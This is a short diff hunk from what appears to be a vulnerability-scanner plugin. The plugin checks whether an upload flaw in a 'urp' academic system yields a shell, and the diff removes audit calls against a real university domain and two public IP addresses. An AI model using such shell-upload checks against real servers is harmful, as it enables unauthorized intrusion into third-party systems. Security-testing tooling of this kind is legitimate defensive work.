@@ -35,12 +35,12 @@ Content-Disposition: form-data; name=\\"xh\\"\r\n\r\n\
         code, head, res, errcode, _ = curl.curl(arg+'testvul.txt')
         if code == 200 and "testvul" in res:
             security_hole('get shell: ' + url)
+            return arg
         else:
             pass
-        
 
-if __name__ == '__main__':
+
+
+
+if __name__== '__main__':
     from dummy import *
-    audit(assign('urp', 'http://jwxt.bibt.edu.cn/')[1])
-    audit(assign('urp', 'http://202.118.88.140/')[1])
-    audit(assign('urp', 'http://219.148.85.172:9080/')[1])
